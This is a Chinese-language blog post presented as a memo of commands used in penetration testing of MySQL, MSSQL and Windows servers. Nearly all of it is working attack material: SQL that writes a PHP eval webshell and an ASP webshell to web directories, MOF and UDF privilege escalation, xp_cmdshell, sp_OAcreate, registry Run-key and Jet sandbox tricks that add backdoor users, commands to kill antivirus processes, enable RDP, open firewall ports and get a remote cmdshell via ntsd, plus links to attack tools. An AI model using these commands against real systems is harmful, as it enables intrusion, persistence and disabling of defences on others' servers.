<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>渗透中常用的命令(备忘) | sqzr&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="励志成为包工头的搬砖者">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透中常用的命令(备忘)">
<meta property="og:url" content="https://sqzr.cc//blog/2014/03/02/shen-tou-zhong-chang-yong-de-ming-ling-bei-wang/">
<meta property="og:site_name" content="sqzr's blog">
<meta property="og:description" content="励志成为包工头的搬砖者">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透中常用的命令(备忘)">
<meta name="twitter:description" content="励志成为包工头的搬砖者">

  
    <link rel="alternative" href="/atom.xml" title="sqzr&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  <link href="//fonts.lug.ustc.edu.cn/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="//dn-sqzr-hexo.qbox.me/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">sqzr&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">记录学习过程中的点点滴滴</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-github-link" class="nav-icon" href="https://github.com/sqzr" title="Github" target="_blank"></a>
        
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="submit" value="&#xF002;" class="search-form-submit"><input type="hidden" name="q" value="site:https://sqzr.cc"></form>
      </div>
    </div>
  </div>
  <script>
    
    document.getElementById("banner").style.backgroundImage = "url(//dn-sqzr-hexo.qbox.me/banner/banner.png)";
    
</script>
</header>

      <div class="outer">
        <section id="main"><article id="post-shen-tou-zhong-chang-yong-de-ming-ling-bei-wang" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
<a href="/blog/2014/03/02/shen-tou-zhong-chang-yong-de-ming-ling-bei-wang/" class="article-date">
  <time datetime="2014-03-02T06:25:00.000Z" itemprop="datePublished">2014-03-02</time>
</a>


    
  <div class="article-category">
    <a class="article-category-link" href="/categories/渗透/">渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      渗透中常用的命令(备忘)
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
		
		<div id="toc" class="toc-article">
			<h2 class="toc-title"><span>文章目录</span></h2>
		
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql中常用命令"><span class="toc-number">1.</span> <span class="toc-text">mysql中常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文章中提到的文件下载地址"><span class="toc-number">1.1.</span> <span class="toc-text">文章中提到的文件下载地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows中常用命令"><span class="toc-number">2.</span> <span class="toc-text">windows中常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文章中提到的文件下载地址-1"><span class="toc-number">2.1.</span> <span class="toc-text">文章中提到的文件下载地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql中常用命令"><span class="toc-number">3.</span> <span class="toc-text">mssql中常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
		
		</div>
		
        <p>文章中并没有提起任何新技术(或者说是未公开的小窍门),都是些已经<code>烂大街</code>的命令了,不过很多命令比较长,也比较实用，以前博客有一篇日志有记录,忘迁移过来就被删除了。在evernote里找到一份备份,就迁移过来吧  </p>
<ul>
<li>2014-3-2 添加mysql windows mssql中常用的命令  </li>
<li>2014-3-29 添加两种查看windows是否开启远程桌面办法  </li>
<li>2014-4-26 添加让win自带的防火墙允许端口进出  </li>
<li>2014-5-5  添加查看占用的命令(windows)  </li>
</ul>
<hr>
<h2 id="mysql中常用命令">mysql中常用命令</h2>
<p>开启mysql外链:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'root密码'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span></div></pre></td></tr></table></figure>

<p>mysql root权限写文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> test (a <span class="built_in">text</span>);</span></div><div class="line"><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> test (a) <span class="keyword">values</span> (&lt;?php eval($_POST[<span class="string">'password'</span>])?&gt;);</span></div><div class="line"><span class="operator"><span class="keyword">select</span> a <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">into</span> <span class="keyword">outfile</span> ‘e://appserv//www//xoops//modules//wordpress//app.php’;</span></div></pre></td></tr></table></figure>

<p>当下载mysql的user.MYD数据库连接密码hash值无法用winhex等十六进制编辑器查看时:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">将下载的user.MYD user.frm user.MYI替换本地文件，然后</div><div class="line">mysqld-nt –skip-<span class="operator"><span class="keyword">grant</span>-<span class="keyword">tables</span>(mysql目录下的<span class="keyword">bin</span>目录下)</span></div><div class="line">重新打开一个cmd</div><div class="line">mysql -u root</div><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span>;</div></pre></td></tr></table></figure>

<p><a id="more"></a><br>mysql mof提权(windows 会自动执行指定目录下的mof文件):<br>将下面文件存在<code>任意位置</code> </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></div><div class="line"></div><div class="line">instance <span class="keyword">of</span> __EventFilter <span class="keyword">as</span> $<span class="type">EventFilter</span></div><div class="line">{</div><div class="line">    <span class="type">EventNamespace</span> = <span class="string">"Root\\Cimv2"</span>;</div><div class="line">    <span class="type">Name</span>  = <span class="string">"filtP2"</span>;</div><div class="line">    <span class="type">Query</span> = <span class="string">"Select * From __InstanceModificationEvent "</span></div><div class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></div><div class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</div><div class="line">    <span class="type">QueryLanguage</span> = <span class="string">"WQL"</span>;</div><div class="line">};</div><div class="line"></div><div class="line">instance <span class="keyword">of</span> <span class="type">ActiveScriptEventConsumer</span> <span class="keyword">as</span> $<span class="type">Consumer</span></div><div class="line">{</div><div class="line">    <span class="type">Name</span> = <span class="string">"consPCSV2"</span>;</div><div class="line">    <span class="type">ScriptingEngine</span> = <span class="string">"JScript"</span>;</div><div class="line">    <span class="type">ScriptText</span> =</div><div class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user ftp test /add\")"</span>;</div><div class="line">};</div><div class="line"></div><div class="line">instance <span class="keyword">of</span> __FilterToConsumerBinding</div><div class="line">{</div><div class="line">    <span class="type">Consumer</span>   = $<span class="type">Consumer</span>;</div><div class="line">    <span class="type">Filter</span> = $<span class="type">EventFilter</span>;</div><div class="line">};</div></pre></td></tr></table></figure>

<p>使用mysql的into dumpfile函数把文件导出到<code>c:/windows/system32/wbem/mof/</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'C:\WINDOWS\temp\1.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/1.mof'</span>;</span></div></pre></td></tr></table></figure>

<p>mysql udf提权(mysql 可以创建自定义函数):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> udf_temp (udf <span class="built_in">BLOB</span>);</span></div><div class="line"><span class="comment">/* 这是创建临时表，为了将udf.dll的代码写入数据库 */</span></div><div class="line"><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">into</span> udf_temp <span class="keyword">values</span> (<span class="keyword">CONVERT</span>(<span class="number">0x4D</span>......,<span class="built_in">CHAR</span>));</span></div><div class="line"><span class="comment">/* 非常长,最后会以文件的形式提供下载(1) */</span></div><div class="line"><span class="operator"><span class="keyword">SELECT</span> udf <span class="keyword">FROM</span> udf_temp <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'c:\\\\windows\\\\system32\\\\mysqlDll.dll'</span>;</span></div><div class="line"><span class="comment">/* 将写入数据库的udf.dll写入硬盘，路径为c:\windows\system32\cmd.exe，注意这里的斜线,不同的mysql版本可能会有不同,所以如果是php的程序,建议用对应的马,会自动读取版本判断位置,下载地址在mysql末尾(2) */</span></div><div class="line"><span class="operator"><span class="keyword">Create</span> <span class="keyword">Function</span> yoco <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'mysqlDll.dll'</span></span></div><div class="line"><span class="comment">/* 创建自定义函数，名称为yoco，这是最后一步，如果这三步都没问题，你就成功了 */</span></div><div class="line"><span class="keyword">select</span> yoco(<span class="string">'cmd命令'</span>);</div><div class="line"><span class="comment">/* 这是执行cmd的格式 */</span></div></pre></td></tr></table></figure>

<hr>
<h3 id="文章中提到的文件下载地址">文章中提到的文件下载地址</h3>
<ol>
<li><a href="http://letitbe.u.qiniudn.com/udf.sql" target="_blank" rel="external">udf.sql</a>  </li>
<li><a href="http://letitbe.u.qiniudn.com/final.php" target="_blank" rel="external">final.php</a>  </li>
<li>另外附一个udf使用windows api添加用户脚本(添加的用户名以及密码都为:msxtest):<a href="http://letitbe.u.qiniudn.com/msx.php" target="_blank" rel="external">msx.php</a>  </li>
</ol>
<hr>
<h2 id="windows中常用命令">windows中常用命令</h2>
<p>读取远程连接端口(16进制):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server<span class="command">\WinStations</span><span class="command">\RDP</span>-Tcp /v PortNumber</div></pre></td></tr></table></figure>

<p>通过netstat判断远程连接端口(也适用于查看某端口是哪个软件占用):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">tasklist</span> /svc <span class="comment"># 找到svchost.exe 服务中有TermService关键字样的,记住pid</span></div><div class="line">netstat -ano <span class="comment"># 加上参数o会输出对应的pid,查找上面找到的pid</span></div></pre></td></tr></table></figure>

<p>开启远程连接服务(默认端口3389):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure>

<p>强制kill进程(在windows2003中能强制结束360,新版的安全狗无法结束了,但可以用killsafedog.exe(1)下载地址在末):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">taskkill /<span class="keyword">im</span> <span class="number">360</span>tray.<span class="keyword">exe</span> /<span class="keyword">f</span></div></pre></td></tr></table></figure>

<p>另一种kill进程的方式(感觉比以上的强,利用windows自带工具<code>ntsd</code>,办法来自<a href="http://www.freebuf.com" target="_blank" rel="external">freebuf</a>某文章的评论):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntsd -<span class="built_in">c</span> q -p pid</div></pre></td></tr></table></figure>

<p>利用ntsd进行端口转发(如果能上传以及执行lcx请尽量用lcx):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器上执行:</div><div class="line">ntsd -server tcp:<span class="variable">port=</span><span class="number">7777</span> cmd.exe <span class="comment"># 这里的cmd.exe只是获得一个宿主进程，当然mstsc.exe 、 calc.exe等等都是可以的</span></div><div class="line">本机上执行:</div><div class="line">ntsd -remote tcp:<span class="variable">server=</span>服务器ip,<span class="variable">port=</span><span class="number">7777</span> <span class="comment"># 运行后会弹出一个窗口，我们输入.shell即可成功获得cmdshell</span></div></pre></td></tr></table></figure>

<p>查看远程桌面有没有开启：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">net</span> start | find <span class="string">"Remote Desktop Services"</span>         <span class="comment">#win7、win2008</span></div><div class="line">net start | find <span class="string">"Terminal Services "</span>                     <span class="comment">#win xp、win2003</span></div></pre></td></tr></table></figure>

<p>或是:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server /v fDenyTSConnections</div></pre></td></tr></table></figure>

<p>如是0×0，则可以连接，考虑是否有tcp过滤或者防火墙了；如果没有打开为0×1。<br>让win自带的防火墙允许某个端口进出:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh firewall <span class="keyword">set</span> portopening TCP <span class="number">1234</span> ENABLE</div></pre></td></tr></table></figure>

<p>netstat 查看占用端口:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -b <span class="comment">// b参数可以列出占用端口的进程名</span></div></pre></td></tr></table></figure>

<hr>
<h3 id="文章中提到的文件下载地址-1">文章中提到的文件下载地址</h3>
<p>1、 <a href="http://letitbe.u.qiniudn.com/KillSafeDog.exe" target="_blank" rel="external">killsafedog.exe</a></p>
<hr>
<h2 id="mssql中常用命令">mssql中常用命令</h2>
<p>xp_cmdshell执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">EXEC</span> master..xp_cmdshell <span class="string">'set'</span>;</div></pre></td></tr></table></figure>

<p>修复xp_cmdshell储存过程:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">Exec</span> <span class="tag">sp_addextendedproc</span> <span class="tag">xp_cmdshell</span> ,<span class="at_rule">@<span class="keyword">dllname</span> =<span class="string">'xplog70.dll'</span></span>;</div></pre></td></tr></table></figure>

<p>利用SP_OAcreate和SP_OAMETHOD执行命令(在wscript.shell组件存在的情况下以及xp_cmdshell和xplog70.dll都被删除的情况下):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">DECLARE</span> <span class="variable">@shell</span> INT; <span class="comment"># 建立一个@shell实体</span></div><div class="line"><span class="title">EXEC</span> SP_OAcreate <span class="string">'wscript.shell'</span>,<span class="variable">@shell</span> out; <span class="comment"># 创建OLE对象的实例</span></div><div class="line"><span class="title">EXEC</span> SP_OAMETHOD <span class="variable">@shell</span>,<span class="string">'run'</span>,null,<span class="string">'net user rfire 123456 /add'</span>; <span class="comment"># 调用@shell这个实例</span></div></pre></td></tr></table></figure>

<p>利用SQL代理执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">EXEC</span> master.dbo.xp_servicecontrol <span class="string">'start'</span>,<span class="string">'SQLSERVERAGENT'</span>; <span class="comment"># 使用xp_servicecontrol启动SQLSERVERAGENT服务</span></div></pre></td></tr></table></figure>

<p>利用注册表项执行命令(用xp_regwrite将执行命令写入启动项):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC master.dbo.xp_regwrite 'SOFTWARE<span class="command">\Microsoft</span><span class="command">\Windows</span><span class="command">\CurrentVersion</span><span class="command">\Run</span><span class="command">\'</span>,'shell'.'REG_SZ','C:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\cmd</span>.exe /c net user rfire 123456 /add';</div></pre></td></tr></table></figure>

<p>利用沙盒模式执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 先利用xp_regwrite（前提是要求xp_regwrite存在）改注册表，然后用OpenRowSet访问系统自身mdb文件，然后执行SQL语句。</span></div><div class="line"><span class="title">EXEC</span> master.dbo.xp_regwrite <span class="string">'HKEY_LOCAL_MACHINE'</span>,<span class="string">'SoftWare\Microsoft\Jet\4.0\Engine'</span>,<span class="string">'SandBoxMode'</span>,<span class="string">'REG_DWORD'</span>,<span class="number">0</span>; <span class="comment"># 开启沙盒模式</span></div><div class="line"><span class="title">Select</span> * From OpenRowSet(<span class="string">'Microsoft.Jet.OLEDB.4.0'</span>,<span class="string">';Database=c:\windows\system32\ias\ias.mdb'</span>,<span class="string">'select shell("net user rfire 123456 /add")'</span>); <span class="comment"># 执行命令</span></div></pre></td></tr></table></figure>

<p>mssql导出一句话:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> pcguest(pc <span class="built_in">char</span>(<span class="number">255</span>));</span><span class="comment">-- # 建一个表用作插入一句话木马</span></div><div class="line"><span class="operator"><span class="keyword">execute</span> sp_makewebtask @outputfile=<span class="string">'E:\Inetpub\wwwroot\PC.ASP'</span>,@<span class="keyword">query</span>=<span class="string">'select pc from pcguest'</span>;</span><span class="comment">--  # 导出一个asp文件</span></div></pre></td></tr></table></figure>

<p>mssql列目录:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> pctest(subdirectory <span class="built_in">VARCHAR</span>(<span class="number">100</span>),depth <span class="built_in">VARCHAR</span>(<span class="number">100</span>),[file] <span class="built_in">VARCHAR</span>(<span class="number">100</span>));</span> # 建一个新表存放列目录数据</div><div class="line"><span class="operator"><span class="keyword">Insert</span> pctest <span class="keyword">exec</span> <span class="keyword">master</span>..xp_dirtree <span class="string">"d:\app\",1,1; # 用xp_dirtree列目录结果导入所建成的表</span></span></div></pre></td></tr></table></figure>

<p>查看mssql版本信息:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> @@<span class="keyword">VERSION</span>;</span></div></pre></td></tr></table></figure>

<p>查看是否sa权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">'sysadmin'</span>);</span></div></pre></td></tr></table></figure>

<p>查看是否db_owner权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> IS_MEMBER(<span class="string">'db_owner'</span>);</span></div></pre></td></tr></table></figure>

<hr>
<p>欢迎大家补充,在渗透中还会用到很多繁琐的命令,很多长而实用的命令记录下来是非常不错的,虽说以上命令都不是我的原创,但希望转载能加个<code>出处</code></p>
<hr>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://www.91ri.org/8075.html" target="_blank" rel="external">【渗透笔记】捌 - 网络安全攻防研究室</a>  </li>
<li><a href="http://www.91ri.org/8524.html" target="_blank" rel="external">【渗透笔记】陆 - 网络安全功放研究室</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
	  
	  <a data-url="https://sqzr.cc//blog/2014/03/02/shen-tou-zhong-chang-yong-de-ming-ling-bei-wang/" data-id="y19gwjd8fe79rgb2" data_title="渗透中常用的命令(备忘)" data_summary="文章中并没有提起任何新技术(或者说是未公开的小窍门),..." class="article-share-link">Share</a>
      

      
	  
      
	  
<span>
更新日期:<time datetime="2014-10-30T13:03:59.000Z" itemprop="dateModified">2014-10-30</time>
</span>


    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/blog/2014/03/04/xi-yu-lun-tan-yong-hu-bao-li-po-jie-jiao-ben-python/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          西域论坛用户暴力破解脚本(python)
        
      </div>
    </a>
  
  
    <a href="/blog/2014/01/14/zai-mac-os-xxia-an-zhuang-mysql-python/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">在Mac os x下安装MySQL-python</div>
    </a>
  
</nav>

  
</article>



<!-- 多说评论框 start -->

<!-- 多说评论框 end -->
</section>
        
          
<aside id="sidebar">

  
    
<div class="widget-wrap">
  <h3 class="widget-title">ABOUT ME</h3>
  <ul class="widget about-me">
    
    <li><img class="author" title="About me" src="//www.gravatar.com/avatar/5ba302d74468e44e87e1e1fd94b127fa?s=180" /></li>
    
    
    <li>励志成为包工头的搬砖者</li>
    
  </ul>
</div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/openwrt/">openwrt</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/折腾/">折腾</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a><span class="category-list-count">4</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/linux/" style="font-size: 20.00px; color: #1db400;">linux</a><a href="/tags/mac/" style="font-size: 15.33px; color: #5dbe94;">mac</a><a href="/tags/mysql/" style="font-size: 13.00px; color: #7dc3de;">mysql</a><a href="/tags/nginx/" style="font-size: 13.00px; color: #7dc3de;">nginx</a><a href="/tags/oracle/" style="font-size: 15.33px; color: #5dbe94;">oracle</a><a href="/tags/python/" style="font-size: 17.67px; color: #3db94a;">python</a><a href="/tags/zmap/" style="font-size: 13.00px; color: #7dc3de;">zmap</a><a href="/tags/神器/" style="font-size: 20.00px; color: #1db400;">神器</a>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">archive</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">June 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a><span class="archive-list-count">8</span></li></ul>
    </div>
  </div>


  

</aside>

        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2014 sqzr<br>
      Powered by <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<!-- 多说公共JS代码 start (一个网页只需插入一次) -->

<!-- 多说公共JS代码 end -->

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<!--
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.min.js"></script>
-->
<script src="//dn-sqzr-hexo.qbox.me/js/jquery.min.js" type="text/javascript"></script>


<link rel="stylesheet" href="//dn-sqzr-hexo.qbox.me/fancybox/jquery.fancybox.css" type="text/css">
<script src="//dn-sqzr-hexo.qbox.me/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<div class="bottom-btn">

	<a class="icon-gotop" href="javascript:void(0)" title="返回顶部"></a>
	<script src="//dn-sqzr-hexo.qbox.me/js/gotop.js" type="text/javascript"></script>


</div>
<script src="//dn-sqzr-hexo.qbox.me/js/toc_aside_toggle.js"></script>

<script src="//dn-sqzr-hexo.qbox.me/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>
